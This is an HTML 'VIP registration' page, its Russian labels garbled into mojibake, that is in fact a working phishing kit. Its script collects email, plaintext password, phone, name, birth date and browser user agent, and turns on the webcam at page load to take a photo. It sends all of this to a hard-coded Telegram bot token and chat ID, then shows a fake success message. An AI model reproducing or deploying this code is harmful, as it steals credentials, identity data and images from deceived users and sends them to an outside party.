<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>VIP –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</title>
  <style>
    :root {
      --primary: #6e45e2; --accent: #ff6b6b; --neon: #00f3ff;
      --bg-dark: #0f0f1a; --bg-light: #f8f9fa; --color-dark: #1a1a2e;
    }
    body {
      margin:0; padding:0; font-family:Arial,sans-serif;
      background:var(--bg-dark); color:var(--bg-light);
      min-height:100vh;
    }
    .container{max-width:600px;margin:0 auto;padding:20px;}
    .logo{font-size:2rem;font-weight:800;color:#6e45e2;text-align:center;margin-bottom:30px;}
    .btn{
      background:linear-gradient(135deg,#6e45e2,#ff6b6b);
      padding:12px 24px;
      border:none;
      color:#fff;
      border-radius:50px;
      cursor:pointer;
      font-size:1rem;
      width:100%;
      margin-top:10px;
    }
    .btn:hover{opacity:0.9;}
    .form-group{margin-bottom:20px;}
    input[type=email],input[type=password],input[type=text],input[type=tel],select{
      width:100%;
      padding:12px;
      border-radius:5px;
      border:none;
      margin-top:5px;
      background:rgba(255,255,255,0.1);
      color:inherit;
      font-size:1rem;
    }
    .error{
      color:#ff6b6b;
      display:none;
      margin:10px 0;
      padding:10px;
      background:rgba(255,107,107,0.1);
      border-radius:5px;
    }
    .success{
      color:#00f3ff;
      display:none;
      margin:10px 0;
      padding:10px;
      background:rgba(0,243,255,0.1);
      border-radius:5px;
    }
    .loading{
      display:inline-block;
      width:20px;
      height:20px;
      border:3px solid rgba(255,255,255,0.3);
      border-radius:50%;
      border-top-color:#fff;
      animation:spin 1s ease-in-out infinite;
      margin-left:10px;
    }
    @keyframes spin{to{transform:rotate(360deg);}}
    #cameraPreview{
      width:100%;
      max-width:300px;
      height:auto;
      display:none;
      margin:15px auto;
      border:2px solid #00f3ff;
      border-radius:5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">VIP –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø</div>

    <form id="registrationForm">
      <div class="form-group">
        <label>Email *</label>
        <input type="email" id="email" required>
      </div>
      
      <div class="form-group">
        <label>–ü–∞—Ä–æ–ª—å *</label>
        <input type="password" id="password" required>
      </div>
      
      <div class="form-group">
        <label>–¢–µ–ª–µ—Ñ–æ–Ω</label>
        <input type="tel" id="phone">
      </div>
      
      <div class="form-group">
        <label>–ü–æ–ª–Ω–æ–µ –∏–º—è</label>
        <input type="text" id="fullName">
      </div>
      
      <div class="form-group">
        <label>–°—Ç—Ä–∞–Ω–∞</label>
        <select id="country">
          <option value="">–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω—É</option>
          <option value="RU">–†–æ—Å—Å–∏—è</option>
          <option value="UA">–£–∫—Ä–∞–∏–Ω–∞</option>
          <option value="KZ">–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω</option>
          <option value="BY">–ë–µ–ª–∞—Ä—É—Å—å</option>
          <option value="other">–î—Ä—É–≥–∞—è</option>
        </select>
      </div>
      
      <div class="form-group">
        <label>–î–∞—Ç–∞ —Ä–æ–∂–¥–µ–Ω–∏—è</label>
        <input type="text" id="birthDate" placeholder="–î–î.–ú–ú.–ì–ì–ì–ì">
      </div>
      
      <div id="cameraPreview">
        <video id="video" width="300" height="200" autoplay></video>
        <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
      </div>
      
      <button type="button" id="takePhotoBtn" class="btn" style="display:none;background:#333;">–°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ</button>
      
      <div class="error" id="errorMessage"></div>
      <div class="success" id="successMessage">–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!</div>
      
      <button type="button" id="submitBtn" class="btn">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
    </form>
  </div>

  <script>
    // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è (–ó–ê–ú–ï–ù–ò–¢–ï –≠–¢–ò –î–ê–ù–ù–´–ï –ù–ê –°–í–û–ò)
    const BOT_TOKEN = "7774453287:AAEn3dh5ebiN7sZFa__Wyf-JXwBUE1wUIrc"; // –ü–æ–ª—É—á–∏—Ç—å —É @BotFather
    const CHAT_ID = "7807571960"; // –í–∞—à ID –º–æ–∂–Ω–æ —É–∑–Ω–∞—Ç—å —É @userinfobot
    
    // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
    const form = document.getElementById('registrationForm');
    const submitBtn = document.getElementById('submitBtn');
    const errorMessage = document.getElementById('errorMessage');
    const successMessage = document.getElementById('successMessage');
    const takePhotoBtn = document.getElementById('takePhotoBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const cameraPreview = document.getElementById('cameraPreview');
    
    let photoData = null;
    let stream = null;

    // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
    async function sendToTelegram(data, photo = null) {
      try {
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è
        let message = `üìù <b>–ù–æ–≤–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</b>\n\n`;
        message += `üìß <b>Email:</b> <code>${data.email}</code>\n`;
        message += `üîë <b>–ü–∞—Ä–æ–ª—å:</b> <code>${data.password}</code>\n`;
        if(data.phone) message += `üì± <b>–¢–µ–ª–µ—Ñ–æ–Ω:</b> ${data.phone}\n`;
        if(data.fullName) message += `üë§ <b>–ò–º—è:</b> ${data.fullName}\n`;
        if(data.country) message += `üåç <b>–°—Ç—Ä–∞–Ω–∞:</b> ${data.country}\n`;
        if(data.birthDate) message += `üéÇ <b>–î–∞—Ç–∞ —Ä–æ–∂–¥–µ–Ω–∏—è:</b> ${data.birthDate}\n\n`;
        message += `üñ•Ô∏è <b>User Agent:</b> ${navigator.userAgent}\n`;
        message += `üìç <b>IP:</b> –ó–∞–ø—Ä–æ—Å IP —á–µ—Ä–µ–∑ —Å–µ—Ä–≤–µ—Ä–Ω—ã–π —Å–∫—Ä–∏–ø—Ç`;
        
        if(photo) {
          // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å —Ñ–æ—Ç–æ
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', photo, 'photo.jpg');
          formData.append('caption', message);
          formData.append('parse_mode', 'HTML');
          
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          
          return await response.json();
        } else {
          // –û—Ç–ø—Ä–∞–≤–∫–∞ –±–µ–∑ —Ñ–æ—Ç–æ
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
              parse_mode: 'HTML'
            })
          });
          
          return await response.json();
        }
      } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
        throw error;
      }
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã
    async function activateCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        cameraPreview.style.display = 'block';
        takePhotoBtn.style.display = 'block';
      } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:", err);
        errorMessage.textContent = "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ";
        errorMessage.style.display = 'block';
      }
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–æ—Ç–æ
    function takePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      
      canvas.toBlob(blob => {
        photoData = blob;
        video.style.display = 'none';
        canvas.style.display = 'block';
        takePhotoBtn.textContent = '–ü–µ—Ä–µ—Å–Ω—è—Ç—å —Ñ–æ—Ç–æ';
      }, 'image/jpeg', 0.9);
    }

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ"
    takePhotoBtn.addEventListener('click', () => {
      if(video.style.display !== 'none') {
        takePhoto();
      } else {
        video.style.display = 'block';
        canvas.style.display = 'none';
        takePhotoBtn.textContent = '–°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ';
      }
    });

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã
    submitBtn.addEventListener('click', async () => {
      // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ —Ñ–æ—Ä–º—ã
      const formData = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        phone: document.getElementById('phone').value,
        fullName: document.getElementById('fullName').value,
        country: document.getElementById('country').value,
        birthDate: document.getElementById('birthDate').value
      };
      
      // –í–∞–ª–∏–¥–∞—Ü–∏—è
      if(!formData.email || !formData.password) {
        errorMessage.textContent = "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è (Email –∏ –ü–∞—Ä–æ–ª—å)";
        errorMessage.style.display = 'block';
        successMessage.style.display = 'none';
        return;
      }
      
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
      submitBtn.disabled = true;
      submitBtn.innerHTML = '–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö <span class="loading"></span>';
      errorMessage.style.display = 'none';
      
      try {
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
        await sendToTelegram(formData, photoData);
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
        successMessage.style.display = 'block';
        
        // –û—á–∏—â–∞–µ–º —Ñ–æ—Ä–º—É
        form.reset();
        if(stream) {
          stream.getTracks().forEach(track => track.stop());
          cameraPreview.style.display = 'none';
          takePhotoBtn.style.display = 'none';
          video.style.display = 'block';
          canvas.style.display = 'none';
          photoData = null;
        }
        
        // –ß–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ —Å–∫—Ä—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ
        setTimeout(() => {
          successMessage.style.display = 'none';
        }, 5000);
      } catch (error) {
        console.error("–û—à–∏–±–∫–∞:", error);
        errorMessage.textContent = "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.";
        errorMessage.style.display = 'block';
      } finally {
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
        submitBtn.disabled = false;
        submitBtn.textContent = '–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø';
      }
    });

    // –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –∫–∞–º–µ—Ä—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
    window.addEventListener('load', () => {
      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        activateCamera();
      }
    });
  </script>
</body>
</html>